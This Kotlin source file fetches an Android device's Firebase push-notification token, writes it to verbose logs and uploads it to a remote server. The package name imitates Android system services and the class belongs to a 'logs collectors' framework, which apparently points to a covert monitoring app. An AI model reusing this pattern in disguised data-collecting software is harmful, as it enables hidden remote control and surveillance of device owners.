package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.FCMToken
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.DeviceInformationUtil
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.messaging.FirebaseMessaging
import java.util.concurrent.Executors

class FcmTokenCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    companion object {
        private const val TAG = "FcmTokenCollector"
    }

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.fcmToken.isNullOrEmpty()) {
            if (DeviceInformationUtil.isGooglePlayServicesAvailable(context) == "1") {
                FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
                    if (!task.isSuccessful) {
                        logException("fcm token failure ", TAG, task.exception)
                        AppConstants.fcmToken = ""
                    } else {
                        // Get new FCM registration token
                        val token = task.result
                        AppConstants.fcmToken = token
                        logVerbose("fcm token success = $token")
                    }
                    uploadFcmToken()
                })
            }
        } else {
            uploadFcmToken()
        }
    }

    private fun uploadFcmToken(): Unit {
        val executeService = Executors.newSingleThreadExecutor()
        executeService.execute {
            val serverHelper = RemoteServerHelper(
                context,
                AppConstants.FCM_TOKEN_TYPE,
                localDatabaseSource,
                tosApi = tosApi
            )
            logVerbose("NonSupportedFcmInfo Fcm Token = ${AppConstants.fcmToken}")
            serverHelper.upload(
                listOf(
                    FCMToken(
                        fcmtokennew = AppConstants.fcmToken!!,
                        fcmtoken = "1"
                    )
                )
            )
        }
    }
}